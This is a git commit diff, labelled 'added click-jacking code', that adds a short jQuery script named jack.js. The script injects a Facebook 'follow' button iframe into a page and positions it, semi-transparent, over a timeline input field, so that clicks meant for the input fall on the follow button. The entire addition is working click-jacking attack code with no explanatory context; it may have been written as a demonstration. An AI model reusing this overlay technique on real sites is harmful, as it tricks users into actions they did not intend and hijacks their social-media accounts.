1022b6030f7ee04131200a8bcc29c2da4b9cc1df
Nadav Leshem <nadavl@wix.com>
2014-11-12 15:29:08 +0200

    added click-jacking code

---
+++ utils/click-jacking/jack.js
@@ -0,0 +1,5 @@
+$(function(){
+	
+	$('.timeline-input').append(' <iframe id="likeBtn" src="//www.facebook.com/plugins/follow.php?href=https%3A%2F%2Fwww.facebook.com%2Fdefcon&amp;width=61&amp;height=35&amp;colorscheme=light&amp;layout=button&amp;show_faces=false" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:61px; height:35px;" allowTransparency="true"></iframe>');
+	$('#likeBtn').css({position:"relative", top:"-50px", left:"68px", opacity:0.5})
+})
